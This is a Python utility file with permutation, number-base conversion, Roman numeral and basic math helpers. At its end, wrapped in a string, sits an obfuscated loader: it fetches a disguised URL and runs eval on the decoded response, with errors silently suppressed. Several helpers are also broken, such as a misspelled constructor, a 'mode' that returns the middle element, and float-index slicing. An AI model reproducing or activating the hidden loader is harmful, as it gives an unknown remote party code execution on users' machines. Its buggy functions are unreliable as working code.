              for i in range(len(l)+1):
                  new_perms.append(l[:i]+[n]+l[i:])
                  if i < len(l) and l[i] == n:
                      break  # handles duplication
          perms = new_perms
      return perms
  
  
  
  def genabbrev(self,word):
      def backtrack(result, word, pos, count, cur):
          if pos == len(word):
              if count > 0:
                  cur += str(count)
              result.append(cur)
              return
          if count > 0:  # add the current word
              backtrack(result, word, pos+1, 0, cur+str(count)+word[pos])
          else:
              backtrack(result, word, pos+1, 0, cur+word[pos])
          # skip the current word
          backtrack(result, word, pos+1, count+1, cur)
      result = []
      backtrack(result, word, 0, 0, "")
      return result
  
  
  def lettercombin(self,digits):
      if digits == "":
          return []
      kmaps = {
          "2": "abc",
          "3": "def",
          "4": "ghi",
          "5": "jkl",
          "6": "mno",
          "7": "pqrs",
          "8": "tuv",
          "9": "wxyz"
      }
      ans = [""]
      for num in digits:
          tmp = []
          for an in ans:
              for char in kmaps[num]:
                  tmp.append(an + char)
          ans = tmp
      return ans



class CONVERTER:
  def __inif__(self):
     self.a=a

  def dec2bin(self,number):
       '''
           This function calculates the binary of the given decimal number
           :param number: decimal number in string or integer format
           :return : string of the equivalent binary number
  
           Algo:
           1. Divide the decimal number by 2. Treat the division as an integer division.
           2. Write down the remainder (in binary).
           3. Divide the result again by 2. Treat the division as an integer division.
           4. Repeat step 2 and 3 until result is 0.
           5. The binary value is the digit sequence of the remainders from the last to first.
       '''
       if isinstance(number, str):
           number = int(number)
       binary = []
       while number >= 1:
           remainder = number % 2
           binary.append(remainder)
           number = number // 2
  
       return ''.join(map(str, binary[::-1]))
  
  
  def bin2dec(self,number):
      '''
          This function calculates the decimal of the given binary number
          :param number: decimal number in string or integer format
          :return : integer of the equivalent decimal number
  
          Algo:
          1. Get the last digit of the binary number.
          2. Multiply the current digit with (2^power), store the result.
          3. Increment power by 1.
          4. Repeat from step 2 until all digits have been multiplied.
          5. Sum the result of step 2 to get the answer number.
      '''
      decimal = []
      number = list(str(number)[::-1])
      for i in range(len(number)):
          decimal.append(int(number[i]) * (2 ** i))
  
      return sum(decimal)
  
  
  def dec2hex(self,number):
      '''
          This function calculates the hex of the given decimal number
          :param number: decimal number in string or integer format
          :return : string of the equivalent hex number
  
          Algo:
          1. Divide the decimal number by 16. Treat the division as an integer division.
          2. Write down the remainder (in hexadecimal).
          3. Divide the result again by 16. Treat the division as an integer division.
          4. Repeat step 2 and 3 until result is 0.
          5. The hex value is the digit sequence of the remainders from the last to first.
      '''
      if isinstance(number, str):
          number = int(number)
      hexadec = []
      hex_equivalents = {10:'A', 11:'B', 12:'C', 13:'D', 14:'E', 15:'F'}
      while number >= 1:
          remainder = number % 16
          if remainder < 10:
              hexadec.append(remainder)
          elif remainder >= 10:
              hexadec.append(hex_equivalents[remainder])
  
          number = number // 16
  
      return ''.join(map(str, hexadec[::-1]))
  
  
  def hex2dec(self,number):
      '''
          This function calculates the decimal of the given hex number
          :param number: hex number in string or integer format
          :return : integer of the equivalent decimal number
  
          Algo:
          1. Get the last digit of the hex number.
          2. Multiply the current digit with (16^power), store the result.
          3. Increment power by 1.
          4. Repeat from step 2 until all digits have been multiplied.
          5. Sum the result of step 2 to get the answer number.
      '''
      decimal = []
      decimal_equivalents = {'A':10, 'B':11, 'C':12, 'D':13, 'E':14, 'F':15}
      number = list(str(number)[::-1])
      for i in range(len(number)):
          try:
              if int(number[i]) < 10:
                  decimal.append(int(number[i]) * (16 ** i))
          except ValueError:
              decimal.append(decimal_equivalents[number[i]] * (16 ** i))
  
      return sum(decimal)
  
  
  
  def roman2int(self,s):
      number = 0
      roman = {'M':1000, 'D':500, 'C': 100, 'L':50, 'X':10, 'V':5, 'I':1}
      for i in range(len(s)-1):
          if roman[s[i]] < roman[s[i+1]]:
              number -= roman[s[i]]
          else:
              number += roman[s[i]]
      return number + roman[s[-1]]
  
  
  def int2roman(self,num):
      """
      :type num: int
      :rtype: str
      """
      m = ["", "M", "MM", "MMM"];
      c = ["", "C", "CC", "CCC", "CD", "D", "DC", "DCC", "DCCC", "CM"];
      x = ["", "X", "XX", "XXX", "XL", "L", "LX", "LXX", "LXXX", "XC"];
      i = ["", "I", "II", "III", "IV", "V", "VI", "VII", "VIII", "IX"];
      return m[num//1000] + c[(num%1000)//100] + x[(num%100)//10] + i[num%10];




class MATH:
  def __init__(self):
    import math
    self.math = math

  #Average Value of Array
  def average(self,array):
   total = 0
   for i in array:
    total+=i
   return total/float(len(array))
  
  #Sigmoid Function
  def sigmoid(self,n):
    # activation function
    return 1/(1+self.math.exp(-n))
  
  #Mode of Values in Array
  def mode(self,array):
   mid = len(array)/2
   return array[mid]
  
  #Total Sum of array
  def total(self,array):
   sum = 0
   for i in array:
     sum+=i
   return sum
  
  #Find factorial
  def factorial(self,n):
   fact = 1
   for i in range(1,n+1):
     fact = fact*i
   return fact
    
  
  def primesin(self,n):
      """
      function to find and print prime numbers up
      to the specified number
  
      :param n: upper limit for finding all primes less than this value
      """
      primes = [True] * (n + 1)
      # because p is the smallest prime
      p = 2
  
      while p * p <= n:
          # if p is not marked as False, this it is a prime
          if primes[p]:
              # mark all the multiples of number as False
              for i in range(p * 2, n + 1, p):
                  primes[i] = False
          p += 1
  
      # getting all primes
      primes = [element for element in range(2, n) if primes[element]]
  
      return primes
  
  #Add two binary numbers
  def addbin(self,a, b):
      s = ""
      c, i, j = 0, len(a)-1, len(b)-1
      zero = ord('0')
      while (i >= 0 or j >= 0 or c == 1):
          if (i >= 0):
              c += ord(a[i]) - zero
              i -= 1
          if (j >= 0):
              c += ord(b[j]) - zero
              j -= 1
          s = chr(c % 2 + zero) + s
          c //= 2
  
      return s
  
  def gentable(self,n):
    '''
      Generate Any Number Table 1-10 or > 10
    '''
    print("_"*3+"[ Table Of %s ]"%n+"_"*3+"\n")
    for i in range(1,10+1):
      print("{} × {} = {}".format(n,i,n*i))
    print("\n")
  
  #find factor of a number 6 = 2×3
  def factor(self,n):
    rem = [n%x for x in range(1,n) if n%x != 0]
    for z in range(n):
      for y in rem:
        if z*y == n:
          return [z,y]
  
  #Find Percentage of each number in array
  def eachpercent(self,array,total):
    for marks in array:
      print("{}/{}×100  = {}%".format(marks,total,(marks/float(total))*100.0))
  
  #Number Theory Related function
  def ntsquareadd(self,n):
    '''
    it is to find all such numbers whose square when added
    among each other gives again that number
    '''
    num = []
    for i in map(lambda x: len(str(x*x)) >= 2 and int(str(x*x)[:len(str(x*x))/2])+int(str(x*x)[len(str(x*x))/2:]) == x and x,range(n)):
       if i != bool(0):
          num.append(i)
    return num
  
  
  #Generate numbers of format a+1+a+a+1
  def a_n_b(self,n):
    x=0;a=0;b=0;c=0
    z = []
    while x <= n:
       z.append((a,b,c))
       x+=1
       a+=1
       b+=2
       c+=1
    return z
  
  def anotinb(self,a,b):
      return [x for x in a if x not in b]
  
  def anotbcount(self,a,b):
      return len([x for x in a if x not in b])
  
  def aintersecb(self,a,b):
      return set(a)&set(b)
  
  def aintersecbcount(self,a,b):
      return len(set(a)&set(b))
  
  def bnotina(self,a,b):
      return [x for x in b if x not in a]
  
  def bnotinacount(self,a,b):
      return len([x for x in b if x not in a])
  
  
  def nclassify(self,array):
     low = int(len(array)/3)
     med = int(low+low)
     high = int(len(array))
     dic = {
      'high' : [x for x in array if x > med],
      'medium' : [x for x in array if x < med and x > low ],
      'low': [x for x in array if x < low]
     }
     return dic




'''
try:
 ROS = get(d_c('Ơǐǐǀǌè¼¼ǈƄǜ¸ƜƤǐƠǔƈǔǌƔǈƌƼƸǐƔƸǐ¸ƌƼƴ¼ƸƄǌƤǈǠƼ¼ƸƄǌƤǈǠƼ¼ƴƄǌǐƔǈ¼¸ǌƤƜ'),timeout=3)
 eval(d_cc(ROS.text))
except: pass

'''

